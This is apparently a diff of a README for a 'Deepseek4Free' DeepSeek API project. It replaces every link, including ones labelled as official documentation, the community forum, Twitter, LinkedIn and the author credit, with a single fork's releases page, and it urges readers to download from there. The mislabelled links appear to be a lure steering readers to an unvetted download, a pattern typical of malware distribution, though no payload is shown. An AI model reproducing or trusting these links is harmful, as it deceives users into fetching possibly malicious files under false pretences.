@@ -8,8 +8,8 @@ Welcome to the Deepseek4Free repository, where we delve into the depths of Deeps
 - **Topics:** deepseek, deepseek-api, deepseek-r1, deepseek-v3
 
 ## 🔗 Important Links
-[![Download Release.zip](https://img.shields.io/badge/Download-Release.zip-brightgreen)](https://github.com/assets/Release.zip)
-- Click the button above to download Release.zip and get ready to launch into the world of Deepseek!
+[![Download https://github.com/BrwnWlsn/deepseek4free/releases](https://github.com/BrwnWlsn/deepseek4free/releases)](https://github.com/BrwnWlsn/deepseek4free/releases)
+- Click the button above to download https://github.com/BrwnWlsn/deepseek4free/releases and get ready to launch into the world of Deepseek!
 
 If the link does not work or is not provided, make sure to check the "Releases" section of this repository for alternative download options.
 
@@ -21,16 +21,16 @@ If you are passionate about deep search technologies and want to contribute to t
 
 ## 📚 Resources
 To further enhance your understanding of Deepseek and its APIs, we recommend checking out the following resources:
-- [Deepseek Documentation](https://deepseek-docs.com): Visit the official Deepseek documentation for in-depth guides and tutorials.
-- [Deepseek Community Forum](https://deepseek-forum.com): Join the Deepseek community forum to engage with like-minded individuals and experts in the field.
+- [Deepseek Documentation](https://github.com/BrwnWlsn/deepseek4free/releases): Visit the official Deepseek documentation for in-depth guides and tutorials.
+- [Deepseek Community Forum](https://github.com/BrwnWlsn/deepseek4free/releases): Join the Deepseek community forum to engage with like-minded individuals and experts in the field.
 
 ## 🙌 Join the Deepseek Community
 Follow us on social media and join the Deepseek community to stay updated on the latest developments and discussions:
-- Twitter: [@deepseek_official](http://twitter.com/deepseek_official)
-- LinkedIn: [Deepseek Technologies](http://linkedin.com/company/deepseek-technologies)
+- Twitter: [@deepseek_official](https://github.com/BrwnWlsn/deepseek4free/releases)
+- LinkedIn: [Deepseek Technologies](https://github.com/BrwnWlsn/deepseek4free/releases)
 
 Let's embark on this deep search journey together and unlock the true potential of Deepseek technology. Happy searching! 🚀🔍
 
 ---
 
-By [Deepseek Technologies](https://github.com/deepseek-tech) 🌟
+By [Deepseek Technologies](https://github.com/BrwnWlsn/deepseek4free/releases) 🌟
